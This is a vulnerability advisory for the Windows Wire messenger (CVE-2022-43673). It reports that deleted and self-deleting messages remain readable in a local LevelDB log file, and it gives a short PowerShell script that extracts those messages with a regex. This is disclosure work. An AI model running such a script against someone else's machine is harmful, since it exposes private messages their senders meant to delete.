secuvera-SA-2022-01: Windows Wire message reading after deletion
Affected Products
Windows version of Wire Version 3.22.3993 (older releases have not been tested)
References
https://www.secuvera.de/advisories/secuvera-SA-2022-01.txt
CVE-2022-43673
Summary:
Wire is described by the manufacturer as the most secure collaboration platform, which keeps the user information private. The Wire chat messenger offers a user the possibility to delete sent messages or send self-deleting messages. By using this features a user is able to delete messages in the wire chat or send a message which deletes itself after an amount of time. Chat participants are not able to the read the deleted chat message afterwards. (see https://support.wire.com/hc/en-us/articles/210744649-Delete-a-message, https://support.wire.com/hc/en-us/articles/213216845-Send-a-self-deleting-message and https://wireapp.medium.com/safe-and-tidy-with-timed-messages%EF%B8%8F-4f26ff17b11b#.xco9e7rg5)
Further Wire creates a log file in "AppData\Roaming\Wire\IndexedDB\https\_app.wire.com\_0.indexeddb.leveldb", in which messages are stored.
Effect:
Wire chat messages are stored in the log file in appdata. After the deletion in chat, stored messages are still readable for a limited period of time, because they are not deleted in the logfile until they are transferred to the database.
Examples:
By using the following powershell script, wire chat messages are displayed, even if they are deleted, but not transferred to the database.
$logpath = $env:APPDATA + '\Wire\IndexedDB\https\_app.wire.com\_0.indexeddb.leveldb'
$logfile = Get-ChildItem $logpath | where name -like "\*.log" | Select -ExpandProperty name
$file = "$logpath\$logfile"
Write-Output "Looking for messages in $file"
$messages = Get-Content -Raw $file
$pattern='status\_"(.\*)mentionsA'
[regex]::Matches($messages, $pattern).Value
